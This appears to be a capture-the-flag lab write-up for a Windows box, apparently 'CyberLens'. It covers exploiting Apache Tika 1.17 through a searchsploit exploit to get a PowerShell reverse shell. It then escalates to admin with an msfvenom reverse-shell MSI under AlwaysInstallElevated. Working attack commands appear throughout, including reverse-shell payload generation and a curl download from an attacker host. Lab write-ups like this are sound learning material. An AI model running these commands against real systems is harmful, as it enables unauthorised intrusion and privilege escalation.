The scans showed smb, 80, rdp ports open
smb showed nothing
in 80, there was a metadata extractor, upon inspecting the source, the script was talking to a port at 61777
When we visit the port, we see an Apache Tika 1.17 server
`searchsploit apache tika 1.17`
`searchsploit -m 46540`

the code needed a "comand" that we need to inject into the meta header, and the tika would run the command for us
Tried with powershell reverse shell from https://www.revshells.com/
Then there was a powershell(base64) one, which actually worked
NOTE - Always try multiple rev shells, if the first one does work

We get a reverse shell,
In C:\Users\Cyberlens\Documents\Management> , we see the user's password for the account, and the user is a part of rdp group
So, we can either do an rdp, or continue here

to get the winPEASx64.exe, 
`curl -o http://10.17.34.38/winPEASx64.exe -o wp.exe`
However, we discover msi always install elevated is enabled, from
`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`

Now we go back to kali, and craft a malicious msi that sends us a reverse shell, and because of AlawysInstallElevaetd is set, it will be run as admin

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.34.38 LPORT=1235 -f msi -o malicious.msi`
Then serve and curl it over to the windows shell. start listening on 1235
In windows shell,
`msiexec /quiet /qn /i C:\Users\CyberLens\malicious.msi`
root!